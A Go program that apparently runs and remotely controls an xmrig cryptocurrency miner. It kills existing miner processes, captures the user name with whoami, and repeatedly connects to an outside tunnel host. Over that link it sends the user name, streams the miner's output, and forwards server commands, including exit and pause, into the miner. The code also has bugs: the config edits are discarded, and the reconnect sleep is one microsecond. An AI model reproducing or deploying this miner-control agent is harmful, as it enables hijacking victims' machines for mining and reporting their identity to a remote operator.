package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup
var execWriter *bufio.Writer
var passName string

func main0() {
	cmd := exec.Command("whoami")
	pass, _ := cmd.CombinedOutput()
	passName = string(pass)

	go handleConn()
	wg.Add(1)
	wg.Wait()

}
func killXmrig() {
	cmd0 := exec.Command("taskkill", "/im", "xmrig.exe", "/f")
	out, _ := cmd0.CombinedOutput()
	fmt.Println(string(out))

}
func WriteFile(fileName string, str string) error {

	//fileName := "file/test2"
	//strTest := "测试测试"
	var d = []byte(str)
	err := ioutil.WriteFile(fileName, d, 0666)
	if err != nil {
		return err
	}
	//fmt.Println("write success")
	return nil
}
func outputErr(e error) {
	WriteFile("C:\\ax.txt", e.Error())
}

func main() {
	killXmrig()
	cmd := exec.Command("whoami")
	pass, _ := cmd.CombinedOutput()
	passName = string(pass)

	go handleConn()
	wg.Add(1)
	config, err := ReadFile("config.json")
	if err != nil {
		panic(err)
	}
	strings.ReplaceAll(config, "1cpt", string(pass))
	strings.ReplaceAll(config, "DEVICE_PASS", string(pass))
	WriteFile("config.json", config)

	cmd = exec.Command("xmrig.exe")
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	stdin, err0 := cmd.StdinPipe()
	execWriter = bufio.NewWriter(stdin)
	if err != nil {
		outputErr(err)
		panic(err)
	}
	if err0 != nil {
		outputErr(err0)
		panic(err0)
	}
	if err = cmd.Start(); err != nil {
		outputErr(err)
		panic(err)
	}

	reader := bufio.NewReader(stdout)
	for {
		line, _, err := reader.ReadLine()
		if err != nil {
			outputErr(err)
			break
		}
		fmt.Println(string(line) + "\n")
		if connected {
			Conn.Write(line)
		}
	}
	wg.Wait()
}

var connected = false
var Conn net.Conn

func handleConn() {
reconn:
	for {
		fmt.Println("conning")
		tcpAddr, _ := net.ResolveTCPAddr("tcp", "us-la-cn2.sakurafrp.com:10300")
		//tcpAddr, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1030")
		conn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err != nil {
			connected = false
			fmt.Println(err.Error())
			outputErr(err)
			continue reconn
		}
		fmt.Println("conned")
		connected = true
		Conn = conn
		conn.Write([]byte("pass " + passName + "\n"))
		conn.Write([]byte("start " + time.Now().String() + "\n"))
		//connWriter=bufio.NewWriter(conn)
		//connWriter.WriteString("pass "+passName+"\n")
		//connWriter.Flush()
		//connWriter.WriteString("start "+time.Now().String()+"\n")
		//connWriter.Flush()
		for {
			reader := bufio.NewReader(conn)
			msgFromServer, _, err := reader.ReadLine()
			if err != nil {
				fmt.Println(err.Error())
				outputErr(err)
				break
			}
			switch string(msgFromServer) {
			case "!exit":
				killXmrig()
				os.Exit(0)
				break
			case "!pause":
				execWriter.Write([]byte("p"))
				break
			}
			fmt.Println(string(msgFromServer))
			if execWriter != nil {
				execWriter.Write(msgFromServer)
				execWriter.Flush()
			}
		}
		time.Sleep(1000)
	}

}

func ReadFile(filename string) (string, error) {

	f, err := ioutil.ReadFile(filename)

	if err != nil {
		outputErr(err)
		return "", err
	}

	return string(f), nil

}
